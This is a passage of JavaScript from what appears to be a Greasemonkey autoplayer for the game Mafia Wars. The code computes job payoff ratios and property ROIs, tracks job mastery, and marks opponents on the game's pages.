    var jobAction = xpathFirst('.//a', currentJob);

    // Skip jobs not in missions array
    var jobMatch = missions.searchArray(jobName, 0)[0];
    if (isNaN(jobMatch)) {
      if (!jobName.match(/Boss/i)) addToLog('search Icon', jobName + ' not found in missions array. ');
      continue;
    }

    jobsFound++;
    var jobPercentage = getJobMastery(currentJob, true);

    // Determine available jobs
    if (isGMChecked('multipleJobs')) {
      // Ignore mastered jobs
      if (jobPercentage == 100) {
        if (masteryList.length > 0 && masteryList.indexOf(String(jobMatch)) != -1)  masteredJobs[city][currentTab].push(jobMatch);
        masteredJobsCount++;
      }

      //ignore job if we have do not have enough energy / stamina to perform the job, otherwise we set jobmastery to 100 to skip this job temporarely
      var skipCurrentJob = false;
      stamElt = xpathFirst('.//dd[@class="stamina"]', currentJob);
      if(stamElt) {
        reqStam = parseInt(stamElt.innerHTML.untag());
        if(reqStam > stamina) {
          skipCurrentJob = true;
          DEBUG('Required Stamina: ' +reqStam+' - Current Stamina: '+stamina+'. Skipping');
        }
      }

      nrgElt = xpathFirst('.//dd[@class="energy"]', currentJob);
      if(!nrgElt) nrgElt = xpathFirst('.//td[@class="job_energy"]', currentJob);
      if(nrgElt) {
        reqNrg = parseInt(nrgElt.innerHTML.untag());
        if(reqNrg > energy) {
          skipCurrentJob = true;
          DEBUG('Required Energy: ' +reqNrg+' - Current Energy: '+energy+'. Skipping');
        }
      }

      // Skip locked jobs and optional fight jobs
      if(isJobLocked(currentJob) || skipCurrentJob || (  ( isGMChecked('skipfight')) && isJobFight(currentJob) ) )
        {
          DEBUG('Job ' + jobName + '(' + jobMatch + ') is - locked - or - skip FIGHT in Vegas - or - lack of /energy/stam - Skipping.');
        } else {
          availableJobs[city][currentTab].push(jobMatch);
      }
    }

    // Skip this for jobs without jobCost
    if (!jobCost) continue;

    // Skip this for jobs without cost
    var costElt = xpathFirst('.//dd[@class="energy"]', jobCost);
    if (!costElt) costElt = xpathFirst('.//dd[@class="stamina"]', jobCost);
    if (!costElt) continue;
    var cost = parseCash(costElt.innerHTML);

    // Is this a boss job?
    var isBossJob = xpathFirst('.//div[@class="job_ribbon ribbon_boss"]', currentJob);
    var isFightJob = xpathFirst('.//div[@class="job_ribbon ribbon_fights"]', currentJob);

    var expElt = xpathFirst('.//dd[@class="experience"]', jobReward);
    if (expElt)   var reward = parseInt(expElt.innerHTML);
    else    var reward = 0;

//  If this isn't a boss job, add 10% to the reward (wheelman bonus)  // the reward should be actually checked or ask for
    if (reward && !isBossJob )
      reward = Math.floor(reward * 1.10); // energy 41- exp 68, actually 74
//  16595 19085
    var moneyElt = xpathFirst('.//dd[@class="vegas_cash_icon"]', jobReward);

    var ratio = Math.round (reward / cost * 100) / 100;
//  var xpTxt = ' (' + ratio + ')'; //original
     var xpTxt = ' ' + reward + ' (' + ratio + ')';

    // Money payout ratio
    var moneyTxt = '';
    if (moneyElt) {
      var money = parseCash(moneyElt.innerHTML.untag());
      // If this isn't a boss job, add 15% to the money payout (bagman bonus)
    if (reward && !isBossJob )
        money = Math.round(money * 1.15);
      //var currency = cities[city][CITY_CASH_SYMBOL];
      var mratio = makeCommaValue(Math.round(money / cost));

      moneyTxt = ' (' + mratio + ')';
    }
    // Calculate time left for each job
    var timePerEnergy = isGMChecked('isManiac') ? 3 : 5;
    timePerEnergy = isGMChecked('hasHelicopter') ? timePerEnergy - .5: timePerEnergy;
    timePerEnergy = isGMChecked('hasGoldenThrone') ? timePerEnergy/2: timePerEnergy;

    var timeTxt = ' Time: 0 min';
    if (cost > energy) timeTxt = 'Time: ' + getDecimalTime((cost - energy) * timePerEnergy);

    if (!xpathFirst('.//span[@id="ratio_xp"]', expElt))
      makeElement('span', expElt, {'title':' Experience Received Is Calculated With 10% Wheelman Bonus Included. ','id':'ratio_xp', 'style':'color:red; font-size: 10px'})
        .appendChild(document.createTextNode(xpTxt));

    if (!xpathFirst('.//span[@id="ratio_money"]', moneyElt))
      makeElement('span', moneyElt, {'title':' Calculated With 15% Bagman Bonus Included','id':'ratio_money', 'style':'color:red; font-size: 10px'})
        .appendChild(document.createTextNode(moneyTxt));
    //makeElement('span', costElt, {'style':'color:green; font-size: 10px'})
      //.appendChild(document.createTextNode(timeTxt));

    updateJobInfo(jobMatch, cost, reward, ratio);

    // Keep track of the best & worst payoffs.
    if (ratio > bestRatio) {
      bestRatio = ratio;
      bestJobs = [costElt];
    } else if (ratio == bestRatio) {
      bestJobs.push(costElt);
    }
    if (ratio < worstRatio) {
      worstRatio = ratio;
      worstJobs = [costElt];
    } else if (ratio == worstRatio) {
      worstJobs.push(costElt);
    }
  }

  var elt;
  // Highlight the best and worst jobs.
  if (worstRatio != bestRatio) {
    var i=0;
    while (bestJobs.length) {
      elt = bestJobs.pop();
      var id = 'bestJob'+i;
      addelt = document.getElementById(id);
      if(!addelt || elt.innerHTML.indexOf('(BEST)') == -1) {
        elt = makeElement('span', elt, {'id':id, 'style':'color:#52E259; font-size: 10px'});
        elt.appendChild(document.createTextNode(' (BEST)'));
      }
      i++;
    }
    i = 0;
    while (worstJobs.length) {
      elt = worstJobs.pop();
      id = 'worstJob'+i;
      addelt = document.getElementById(id);
      if(!addelt || elt.innerHTML.indexOf('(WORST)') == -1) {
        elt = makeElement('span', elt, {'id':id, 'style':'color:#EC2D2D; font-size: 10px'});
        elt.appendChild(document.createTextNode(' (WORST)'));
      }
      i++;
    }
  }

  // Show the experience to energy ratio needed to level up.
  if (!document.getElementById('level_up_ratio')) {
    elt = makeElement('div', null, {'id':'level_up_ratio', 'style':'position:absolute; text-align: left; right:60px; font-size: 10px; width: 80px; display:none'});
    makeElement('img', elt, {'src':stripURI(infoIcon), 'style':'vertical-align:middle'});
    elt.appendChild(document.createTextNode(''));
    var positionElt = xpathFirst('.//div[@id="job_paths"]/div[contains(@style,"clear")]', innerPageElt);
    positionElt.parentNode.insertBefore(elt, positionElt);
  }

  setLevelUpRatio();

  if(reselectJob) canMission();
  GM_setValue('availableJobs', JSON.stringify(availableJobs));
  GM_setValue('masteredJobs', JSON.stringify(masteredJobs));

  // Set the job progress
  jobMastery(innerPageElt, true);
  tierMastery(jobsFound, masteredJobsCount, currentTab);

  return true;
}

function customizeNewJobs() {
  // Handle new job layout
  var newJobs = $x('.//div[@id="new_user_jobs"]//div[contains(@class, "job clearfix")]', innerPageElt);

  if (!newJobs || newJobs.length == 0) return false;

  DEBUG('Found ' + newJobs.length + ' new jobs.');

  var availableJobs = eval('({0:{},1:{},2:{},3:{},4:{}})');
  var masteredJobs = eval('({0:{},1:{},2:{},3:{},4:{}})');
  try {
    availableJobs = eval('(' + GM_getValue('availableJobs') + ')');
    masteredJobs = eval('(' + GM_getValue('masteredJobs') + ')');
  } catch (ex) {
    // ignore
  }
  var currentTab = currentJobTab();
  availableJobs[city][currentTab] = [];
  masteredJobs[city][currentTab] = [];

  // FIXME: Change this once we encounter locked jobs for the new header
  var isJobLocked = function (thisJob) {
    return /locked/i.test(thisJob.innerHTML.untag());
  };

  // Display an experience to energy payoff ratio for each job.
  var bestJobs = [], worstJobs = [];
  var bestRatio = 0, worstRatio = 10;
  var reselectJob = false;
  var masteryList = getSavedList('masteryJobsList');

  var masteredJobsCount = 0;
  var jobsFound = 0;
  for (var i = 0, iLength = newJobs.length; i < iLength; ++i) {
    var currentJob = newJobs[i];

    var jobName = xpathFirst('.//div[@class="title_results"]//h3', currentJob).innerHTML.clean().trim();
    var jobCost = xpathFirst('.//div[@class="use_pay"]//dl[contains(.,"Uses")]', currentJob);
    var jobReward = xpathFirst('.//div[@class="use_pay"]//dl[contains(.,"Pays")]', currentJob);
    var jobAction = xpathFirst('.//a', currentJob);

    // Skip jobs not in missions array
    var jobMatch = missions.searchArray(jobName, 0)[0];
    if (isNaN(jobMatch)) {
      addToLog('search Icon', jobName + ' not found in missions array. ');
      continue;
    }

    jobsFound++;
    var jobPercentage = getJobMastery(currentJob, true);

    // Determine available jobs
    if (isGMChecked('multipleJobs')) {
      // Ignore mastered jobs
      if (jobPercentage == 100) {
        if (masteryList.length > 0 && masteryList.indexOf(String(jobMatch)) != -1)
          masteredJobs[city][currentTab].push(jobMatch);
        masteredJobsCount++;
      }

      // Skip locked jobs
      if (isJobLocked(currentJob)) {
        DEBUG('Job ' + jobName + '(' + jobMatch + ') is locked. Skipping.');
      } else {
        availableJobs[city][currentTab].push(jobMatch);
      }
    }

    // Skip this for jobs without jobCost
    if (!jobCost) continue;

    // Skip this for jobs without cost
    var costElt = xpathFirst('.//dd[@class="energy"]', jobCost);
    if (!costElt) continue;
    var cost = parseCash(costElt.innerHTML);

    var expElt = xpathFirst('.//dd[@class="experience"]', jobReward);
    if (expElt)
      var reward = parseInt(expElt.innerHTML);
    else
      var reward = 0;

    var moneyElt = xpathFirst('.//dd[@class="cash cash_'+cities[city][CITY_ALIAS]+'"]', jobReward);

    // XP payout ratio
    var ratio = Math.round(reward / cost * 100) / 100;
    var xpTxt = 'XP: ' + ratio + 'x';

    // Money payout ratio
    var moneyTxt = '';
    if (moneyElt) {
      var money = parseCash(moneyElt.innerHTML.untag());
      var currency = cities[city][CITY_CASH_SYMBOL];
      var mratio = makeCommaValue(Math.round(money / cost));

      moneyTxt = ', $$$: ' + currency + mratio + 'x';
    }

    // Calculate time left for each job
    var timePerEnergy = isGMChecked('isManiac') ? 3 : 5;
    timePerEnergy = isGMChecked('hasHelicopter') ? timePerEnergy - .5: timePerEnergy;
    timePerEnergy = isGMChecked('hasGoldenThrone') ? timePerEnergy/2: timePerEnergy;

    var timeTxt = ' Time: 0 min';
    if (cost > energy) timeTxt = 'Time: ' + getDecimalTime((cost - energy) * timePerEnergy);

    makeElement('span', costElt, {'style':'color:red; font-size: 10px'})
      .appendChild(document.createTextNode(' [' + xpTxt + moneyTxt + ']'));
    makeElement('span', costElt, {'style':'color:green; font-size: 10px'})
      .appendChild(document.createTextNode(timeTxt));

    updateJobInfo(jobMatch, cost, reward, ratio);

    // Keep track of the best & worst payoffs.
    if (ratio > bestRatio) {
      bestRatio = ratio;
      bestJobs = [costElt];
    } else if (ratio == bestRatio) {
      bestJobs.push(costElt);
    }
    if (ratio < worstRatio) {
      worstRatio = ratio;
      worstJobs = [costElt];
    } else if (ratio == worstRatio) {
      worstJobs.push(costElt);
    }
  }

  // Highlight the best and worst jobs.
  var elt;
  if (worstRatio != bestRatio) {
    while (bestJobs.length) {
      elt = bestJobs.pop();
      makeElement('br', elt);
      elt = makeElement('span', elt, {'style':'color:#52E259; font-size: 10px'});
      makeElement('img', elt, {'src':stripURI(yeahIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle'});
      elt.appendChild(document.createTextNode(' BEST'));
    }
    while (worstJobs.length) {
      elt = worstJobs.pop();
      makeElement('br', elt);
      elt = makeElement('span', elt, {'style':'color:#EC2D2D; font-size: 10px'});
      makeElement('img', elt, {'src':stripURI(omgIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle'});
      elt.appendChild(document.createTextNode(' WORST'));
    }
  }

  // Show the experience to energy ratio needed to level up.
  elt = makeElement('div', null, {'id':'level_up_ratio', 'style':'text-align:center; display:none;'});
  makeElement('img', elt, {'src':stripURI(infoIcon), 'style':'vertical-align:middle'});
  elt.appendChild(document.createTextNode(''));
  newJobs[0].parentNode.insertBefore(elt, newJobs[0]);

  setLevelUpRatio();
  if(reselectJob) canMission();
  GM_setValue('availableJobs', JSON.stringify(availableJobs));
  GM_setValue('masteredJobs', JSON.stringify(masteredJobs));

  // Set the job progress
  jobMastery(innerPageElt, true);
  tierMastery(jobsFound, masteredJobsCount, currentTab);

  return true;
}

function isJobFight (jobAction) {  return (jobAction.innerHTML.indexOf('fight_list') >= 0 );  }

function isJobLocked (jobAction) {
  return (jobAction.innerHTML.untag().indexOf('lock') >= 0 && jobAction.innerHTML.untag().indexOf('Help') == -1);

}

// Return item name if missing job item is from a business
function requiresBizItem (jobRow) {
  var reqItems = $x('.//div[@class="req_item"]//img', jobRow);
  if (reqItems && reqItems.length > 0) {
    for (var i = 0, iLength = reqItems.length; i < iLength; ++i) {
      if (!isNaN(bizJobItems.searchArray(reqItems[i].alt, 0)[0]))
        return reqItems[i].alt;
    }
  }
  return false;
}

function customizeJobs() {

  // Extras for jobs pages.
  var jobTables = $x('.//table[@class="job_list"]', innerPageElt);

  if (!jobTables || jobTables.length == 0) return false;

  var availableJobs = eval('({0:{},1:{},2:{},3:{},4:{}})');
  var masteredJobs = eval('({0:{},1:{},2:{},3:{},4:{}})');
  try {
    availableJobs = eval('(' + GM_getValue('availableJobs') + ')');
    masteredJobs = eval('(' + GM_getValue('masteredJobs') + ')');
  } catch (ex) {
    // ignore
  }
  var currentTab = currentJobTab();
  availableJobs[city][currentTab] = [];
  masteredJobs[city][currentTab] = [];

  // Display an experience to energy payoff ratio for each job.
  var bestJobs = [], worstJobs = [];
  var bestRatio = 0, worstRatio = 10;
  var reselectJob = false;
  var masteryList = getSavedList('masteryJobsList');

  var masteredJobsCount = 0;
  var jobsFound = 0;
  for (var x = 0, xLength = jobTables.length; x < xLength; ++x) {
    //newlv
    var jobNames = xpath('.//td[@class="job_name" or @class="job_name job_no_border" or @class="job_name " or @class="job_title " or @class="job_name_oneline job_no_border" ]', jobTables[x]);
    // var jobNames = xpath('.//td[@class="job_name" or @class="job_name job_no_border" or @class="job_name " or @class="job_name_oneline job_no_border"]', jobTables[x]);

    for (var i = 0, iLength = jobNames.snapshotLength; i < iLength; ++i) {
      var jobName = jobNames.snapshotItem(i).innerHTML.split('<br>')[0].clean().trim();

      // Skip this name if job row is not found
      var jobRow = getJobRow (jobName);
      if (!jobRow) continue;

      // Skip jobs not in missions array
      var jobMatch = missions.searchArray(jobName, 0)[0];
      if (isNaN(jobMatch)) {
        if (!/Level[\s\w]+Master/.test(jobName)) {
          var choiceMatch = choiceJobs.searchArray(jobName,1)[0];
          if (isNaN(choiceMatch))
            addToLog('search Icon', jobName + ' not found in missions array.');
        }
        continue;
      }

      jobsFound++;
      var jobPercentage = getJobMastery(jobRow, false);
      var jobInfo = xpathFirst('.//td[contains(@class,"job_name") and contains(.,"Master")]', jobRow);
      var jobCost = xpathFirst('.//td[contains(@class,"job_energy")]', jobRow);
      var jobReward = xpathFirst('.//td[contains(@class,"job_reward")]', jobRow);
      var jobAction = xpathFirst('.//td[contains(@class,"job_action")]', jobRow);

      // Determine available jobs
      if (isGMChecked('multipleJobs')) {
        // Ignore mastered jobs
        if (jobPercentage == 100) {
          if (masteryList.length > 0 && masteryList.indexOf(String(jobMatch)) != -1)
            masteredJobs[city][currentTab].push(jobMatch);
          masteredJobsCount++;
        }

        // Skip locked jobs
        if (isJobLocked(jobRow)) {
          DEBUG('Job ' + jobName + '(' + jobMatch + ') is locked. Skipping.');
        } else {
          var item = requiresBizItem (jobRow);
          if (item != false) {
            DEBUG('Not enough business items ['+item+'] for ' + jobName + ' [' + jobMatch + ']. Skipping.');
          } else {
            availableJobs[city][currentTab].push(jobMatch);
          }
        }
      }

      var costElt = xpathFirst('.//span[@class="bold_number"]', jobCost);
      // Skip this for jobs without cost
      if (!costElt) continue;
      var cost = parseInt(costElt.innerHTML);

      var expElt = xpathFirst('.//span[@class="bold_number"]', jobReward);
      var reward = parseInt(expElt.innerHTML);

      var moneyElt = xpathFirst('.//span[@class="money"]/strong', jobReward);

      // Display ratio and timer
      var ratio = Math.round(reward / cost * 100) / 100;

      makeElement('br', costElt.parentNode);
      makeElement('span', costElt.parentNode, {'style':'color:#666666; font-size: 10px'}).appendChild(document.createTextNode('Pays ' + ratio + 'x'));

      updateJobInfo(jobMatch, cost, reward, ratio);

      if (moneyElt) {
        var money = parseCash(moneyElt.innerHTML);
        var currency = cities[city][CITY_CASH_SYMBOL];
        var mratio = makeCommaValue(Math.round(money / cost));

        makeElement('span', moneyElt.parentNode, {'style':'color:#666666; font-size: 10px'}).appendChild(document.createTextNode(' (' + currency + mratio + ')'));
      }

      // Keep track of the best & worst payoffs.
      if (ratio > bestRatio) {
        bestRatio = ratio;
        bestJobs = [costElt];
      } else if (ratio == bestRatio) {
        bestJobs.push(costElt);
      }
      if (ratio < worstRatio) {
        worstRatio = ratio;
        worstJobs = [costElt];
      } else if (ratio == worstRatio) {
        worstJobs.push(costElt);
      }

      // Calculate time left for each job and display under the do job button
      var timePerEnergy = isGMChecked('isManiac') ? 3 : 5;
      timePerEnergy = isGMChecked('hasHelicopter') ? timePerEnergy - .5: timePerEnergy;
      timePerEnergy = isGMChecked('hasGoldenThrone') ? timePerEnergy/2: timePerEnergy;

      if (cost > energy) jobTimeLeftText = 'Time: ' + getDecimalTime((cost - energy) * timePerEnergy);
      else               jobTimeLeftText = 'Time: 0 min';

      makeElement('br', jobAction);
      makeElement('span', jobAction, {'style':'color:#666666; font-size: 10px'}).appendChild(document.createTextNode(jobTimeLeftText));
    }
  }

  // Highlight the best and worst jobs.
  var elt;
  if (worstRatio != bestRatio) {
    while (bestJobs.length) {
      elt = bestJobs.pop().parentNode;
      makeElement('br', elt);
      elt = makeElement('span', elt, {'style':'color:#52E259; font-size: 10px'});
      makeElement('img', elt, {'src':stripURI(yeahIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle'});
      elt.appendChild(document.createTextNode(' BEST'));
    }
    while (worstJobs.length) {
      elt = worstJobs.pop().parentNode;
      makeElement('br', elt);
      elt = makeElement('span', elt, {'style':'color:#EC2D2D; font-size: 10px'});
      makeElement('img', elt, {'src':stripURI(omgIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle'});
      elt.appendChild(document.createTextNode(' WORST'));
    }
  }

  // Show the experience to energy ratio needed to level up.
  elt = makeElement('div', null, {'id':'level_up_ratio', 'style':'position:absolute; text-align: center; right:10px; font-size: 12px; width: 180px; display:none;'});
  makeElement('img', elt, {'src':stripURI(infoIcon), 'style':'vertical-align:middle'});
  elt.appendChild(document.createTextNode(''));
  jobTables[0].parentNode.insertBefore(elt, jobTables[0]);

  setLevelUpRatio();
  if(reselectJob) canMission();
  GM_setValue('availableJobs', JSON.stringify(availableJobs));
  GM_setValue('masteredJobs', JSON.stringify(masteredJobs));

  // Set the job progress
  jobMastery(innerPageElt, false);
  DEBUG('Jobs found: ' + jobsFound + ', Mastered jobs: ' + masteredJobsCount);
  tierMastery(jobsFound, masteredJobsCount, currentTab);

  return true;
}

function updateJobInfo (jobMatch, cost, reward, ratio) {
  var missionItem = missions[jobMatch];
  // If values are not in synch, update mission array
  if (!isNaN(jobMatch) &&
      (missionItem[MISSION_ENERGY] != cost ||
       missionItem[MISSION_XP] != reward ||
       missionItem[MISSION_RATIO] != ratio)) {

    missions[jobMatch][MISSION_ENERGY] = cost;
    missions[jobMatch][MISSION_XP] = reward;
    missions[jobMatch][MISSION_RATIO] = ratio;

    // Save joblist
    GM_setValue('missions', JSON.stringify(missions));
  }
}

function tierMastery(jobsFound, jobsMastered, currentTab) {
  if (running && isGMChecked('multipleJobs') &&
      GM_getValue('selectTier') != '0.0') {
    selectedTierValue = GM_getValue('selectTier').split('.');
    masteryCity = parseInt(selectedTierValue[0]);
    masteryTier = parseInt(selectedTierValue[1]);
    if (city == masteryCity &&
        masteryTier == currentTab &&
        jobsFound <= jobsMastered) {
      selectTier = cities[masteryCity][0] + ' - ' + missionTabs[masteryCity][masteryTier - 1];
      addToLog('info Icon', 'Tier ' + selectTier + ' is already mastered. Moving on to the next tier.');

      // Move on the the next tier.
      if (missionTabs[masteryCity].length == masteryTier) {
        // We have mastered all tiers. Disable tier mastery logic.
        if (cities.length == (masteryCity + 1)) {
          GM_setValue('selectTier', '0.0');
        // Next City
        } else {
          masteryCity++;
          masteryTier = 1;
        }
      // Next Tier
      } else {
        masteryTier++;
      }

      if (GM_getValue('selectTier') != '0.0') {
        var mastery_jobs_list = [];
        for (i = 0, iLength = missions.length; i < iLength; i++) {
          if (masteryCity == missions[i][MISSION_CITY] &&
              masteryTier == missions[i][MISSION_TAB]) {
            mastery_jobs_list.push(i);
          }
        }
        setSavedList('masteryJobsList', mastery_jobs_list);
        GM_setValue('selectTier', masteryCity + '.' + masteryTier);
      }
    }
  }
}

function customizeFight() {
  // No need to do this when AP is running
  if (running) return true;

  var opponents = getDisplayedOpponents(innerPageElt, true);
  if (!opponents) return false;

  // Customize the opponent list.
  var blacklist = getSavedList('fightListAvoid');
  for (var i = 0, iLength=opponents.length; i < iLength; ++i) {
    var opponent = opponents[i];
    if (!opponent.profile || !opponent.id) continue;

    // Mark targets that should be avoided.
    if (blacklist.indexOf(opponent.id) != -1) {
      var parentElt = opponent.profile.parentNode;
      var elt = makeElement('img', null, {'src':stripURI(omgIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle', 'title':'You have already lost to this opponent during automatic play.'});
      parentElt.insertBefore(elt, parentElt.firstChild);
    }
  }
  return true;
}

function customizeProps() {
  // Not on properties page (no <object> or <div> with @id="flash_content_propertiesV2" and no flashblock found)
  if (!xpathFirst('.//*[@id="flash_content_propertiesV2"]', innerPageElt) && !xpathFirst('.//div[@id="propertyV2Help"]', innerPageElt))
    return false;

  // Check flash
  var propsDiv = xpathFirst('.//div[@id="flash_content_propertiesV2"]', innerPageElt);
  if (!propsDiv) {
    // Flash is enabled (we either found an <object> or flashblock is active)
    isFlashed = FLASH_ENABLED;
    var flashLog = 'Warning: Flash is enabled. You must disable flash from your browser for PS MWAP to ' +
                   'get exact collect times, show property ROIs and auto-upgrade properties.<br>' +
                   'Visit <a href="http://www.playerscripts.com">PS MWAP for Firefox</a> or ' +
                   '<a href="http://www.playerscripts.com/index.php?option=com_jumi&fileid=3&Itemid=18">PS MWAP for Chrome</a> for instructions.';
    if (isGMChecked('autoBuy'))
      addToLog('updateBad Icon', flashLog);
    else
      DEBUG(flashLog);
    return true;
  }
  // Flash is disabled
  isFlashed = FLASH_DISABLED;

  GM_setValue('bestProp' + cities[city][CITY_NAME], 'skip');

  // Calculate ROIs and best buy
  var propRows = $x('.//tr[contains(@style,"margin-bottom")]', propsDiv);
  var bestElt, bestROI = 0;
  var worstElt, worstROI = 10;
  var nextTake = '1 day';
  for (var i = 0, iLength = propRows.length; i < iLength; ++i) {
    var props = $x('.//td[contains(@style,"padding-right")]', propRows[i]);

    var prop =  {'name'  : props[0].innerHTML,
                 'id'    : (i + 1),
                'level'  : parseFloat(props[1].innerHTML),
                'cost'   : parseFloat(props[2].innerHTML.untag().replace(/[\D]/gi,''))}

    // ROI
    prop['roi'] = propsData[i][1] / prop['cost'];

    // Set next take time
    if  (/href=/.test(props[4].innerHTML))
      nextTake = '00:00';
    else if (!/N\/A/.test(props[4].innerHTML) && timeLeft(props[4].innerHTML) < timeLeft(nextTake))
      nextTake = props[4].innerHTML;

    // Show ROI
    if (i > 0 && !isNaN(prop['roi'])) {
      props[3].innerHTML += '<br><span style="color: green; font-weight: bold; font-size: 10px;">ROI: '+prop['roi'].toExponential(4)+'</span>'

      // Best ROI
      if (prop['roi'] > bestROI) {
        bestElt = props[3];
        bestROI = prop['roi'];
        GM_setValue('bestProp' + cities[city][CITY_NAME], JSON.stringify(prop));
      }

      // Worst ROI
      if (prop['roi'] < worstROI) {
        worstElt = props[3];
        worstROI = prop['roi'];
      }
    }
    DEBUG(JSON.stringify(prop));

    // Casino is the last property
    if (/Casino/i.test(prop['name'])) break;
  }

  // Set next collection time
  DEBUG('Next '+cities[city][CITY_NAME]+' take: ' + nextTake);
  setGMTime('takeHour' + cities[city][CITY_NAME], nextTake);

  // Label best roi
  var elt = makeElement('span', bestElt, {'style':'color:#52E259; font-size: 10px'});
  makeElement('img', bestElt, {'src':stripURI(yeahIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle'});
  elt.appendChild(document.createTextNode(' BEST'));

  // Label worst roi
  elt = makeElement('span', worstElt, {'style':'color:#EC2D2D; font-size: 10px'});
  makeElement('img', worstElt, {'src':stripURI(omgIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle'});
  elt.appendChild(document.createTextNode(' WORST'));

  DEBUG('Best ' + cities[city][CITY_NAME] + ' property: ' + JSON.stringify(GM_getValue('bestProp' + cities[city][CITY_NAME])));

  return true;
}

function customizeHitlist() {
  // No need to do this when AP is running
  if (running) return true;

  // Extras for hitlist.
  if (!onHitlistTab()) return false;

  // Get the displayed opponents.
  var opponents = getHitlist(innerPageElt, true);
  if (!opponents) return true;

  // Customize the opponent list.
  var blacklist = getSavedList('hitmanListAvoid').concat(getSavedList('fightListAvoid'));
  var kills = getSavedList('hitmanListKilled');
  for (var i = 0, iLength=opponents.length; i < iLength; ++i) {
    var opponent = opponents[i];
    if (!opponent.profile) continue;

    // Mark targets that should be avoided.
    var elt, parentElt;
    if (blacklist.indexOf(opponent.id) != -1) {
      parentElt = opponent.profile.parentNode;
      elt = makeElement('img', null, {'src':stripURI(omgIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle', 'title':'You have already lost to this opponent during automatic play.'});
      parentElt.insertBefore(elt, parentElt.firstChild);
    }

    // Mark targets on which bounties have already been collected.
    if (kills.indexOf(opponent.id) != -1) {
      parentElt = opponent.profile.parentNode;
      elt = makeElement('img', null, {'src':stripURI(lootbagIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle', 'title':'You have already collected a bounty on this target during automatic play.'});
      parentElt.insertBefore(elt, parentElt.firstChild);
    }
  }

  return true;
}

function setLevelUpRatio() {
  var elt = document.getElementById('level_up_ratio');
  if (elt) {
    if (energy) {
      var ratio = Math.ceil((ptsToNextLevel) / energy * 100) / 100;
      //elt.childNodes[1].nodeValue = ' A ' + (ratio > 10? '>10' : ratio) + 'x pay ratio would be needed to level up on energy alone.';
      elt.childNodes[1].nodeValue = ' Ratio needed: ' + (ratio > 10? '>10' : ratio) + 'x.';
      elt.style.display = 'block';
    } else {
      elt.style.display = 'none';
    }
  }
}

// Callback for clicking 'Add to Fight List' on profile page.
function clickFightListAdd() {
  addSavedListItem('fightList', this.id);
  this.firstChild.nodeValue = 'Remove from Fight List';
  this.removeEventListener('click', clickFightListAdd, false);
  this.addEventListener('click', clickFightListRemove, false);
  var el = document.getElementById('fightList');
  if (el) {
    el.value = GM_getValue('fightList', '');
  }
}

// Callback for clicking 'Remove from Fight List' on profile page.
function clickFightListRemove() {
  while(removeSavedListItem('fightList', this.id))
  this.firstChild.nodeValue = 'Add to Fight List';
  this.removeEventListener('click', clickFightListRemove, false);
  this.addEventListener('click', clickFightListAdd, false);
  var el = document.getElementById('fightList');
  if (el) {
    el.value = GM_getValue('fightList', '');
  }
}// Callback for clicking 'Add to AutoHit List' on profile page.
function clickAutoHitListAdd() {
  addSavedListItem('autoHitOpponentList', this.id);
  this.firstChild.nodeValue = 'Remove from AutoHit List';
  this.removeEventListener('click', clickAutoHitListAdd, false);
  this.addEventListener('click', clickAutoHitListRemove, false);
  var el = document.getElementById('autoHitOpponentList');
  if (el) {
    el.value = GM_getValue('autoHitOpponentList', '');
  }
}

// Callback for clicking 'Remove from AutoHit List' on profile page.
function clickAutoHitListRemove() {
  while(removeSavedListItem('autoHitOpponentList', this.id))
  this.firstChild.nodeValue = 'Add to AutoHit List';
  this.removeEventListener('click', clickAutoHitListRemove, false);
  this.addEventListener('click', clickAutoHitListAdd, false);
  var el = document.getElementById('autoHitOpponentList');
  if (el) {
    el.value = GM_getValue('autoHitOpponentList', '');
  }
}

// Callback for clicking 'Add to War List' on profile page.
function clickWarListAdd() {
  addSavedListItem('autoWarTargetList', this.id);
  this.firstChild.nodeValue = 'Remove from War List';
  this.removeEventListener('click', clickWarListAdd, false);
  this.addEventListener('click', clickWarListRemove, false);
  var el = document.getElementById('autoWarTargetList');
  if (el) {
    el.value = GM_getValue('autoWarTargetList', '');
  }
}

// Callback for clicking 'Remove from War List' on profile page.
function clickWarListRemove() {
  while(removeSavedListItem('autoWarTargetList', this.id))
  this.firstChild.nodeValue = 'Add to War List';
  this.removeEventListener('click', clickWarListRemove, false);
  this.addEventListener('click', clickWarListAdd, false);
  var el = document.getElementById('autoWarTargetList');
  if (el) {
    el.value = GM_getValue('autoWarTargetList', '');
  }
}

function getJobRow(jobName, contextNode) {
  var rowElt, conTxt = '',LVjob=0;
  try {
    // Retrieve by job number first
    var jobMatch = missions.searchArray(jobName, 0)[0];
    if (!isNaN(jobMatch)) {
      var jobno = missions[jobMatch][MISSION_NUMBER];
      rowElt = xpathFirst('.//table[@class="job_list"]//a[contains(@onclick, "job=' + jobno + '&")]', contextNode);
      //Fetching logic for Vegas jobs
      if (!rowElt && (city==LV)) {
        var jobContainer = "job"+jobno;
        rowElt = xpathFirst('.//div[@id="'+jobContainer+'"]', contextNode);
        LVjob = 1;
      }
    }

    // cheat way to buy needed stuff and not wait for a reply   works as is
    var elt = xpathFirst('.//a[contains(@onclick, "MapController.buyItems('+jobno+'); return false;")]') ;
    if(elt) {
      DEBUG('Cheating on buying for now found a link to click - - jobno=' + jobno );
      clickElement(elt);
    }

    // If no rows found, retrieve by name
    if (!rowElt) {
      // Tokenize job name words
      var jobNameTokens = jobName.replace (/"/g,' ').replace(/'/g, ' ').split(' ');
      for (var i = 0; i < jobNameTokens.length; ++i) {
        if (jobNameTokens[i].length > 1) {
          if (conTxt.length > 0) conTxt += ' and ';
          conTxt += 'contains(., "'+jobNameTokens[i]+'")';
        }
      }
      rowElt = xpathFirst('.//table[@class="job_list"]//tr//td['+conTxt+']', contextNode);
    }

    // Get the parent TR
    if (rowElt && !LVjob){
      while (rowElt.tagName != "TR") rowElt = rowElt.parentNode;
    }

    // Fetching logic for new job rows
    if (!rowElt) rowElt = xpathFirst('.//div[@id="new_user_jobs"]//div[contains(@class, "job clearfix") and '+conTxt+']', contextNode);

  } catch(ex) {
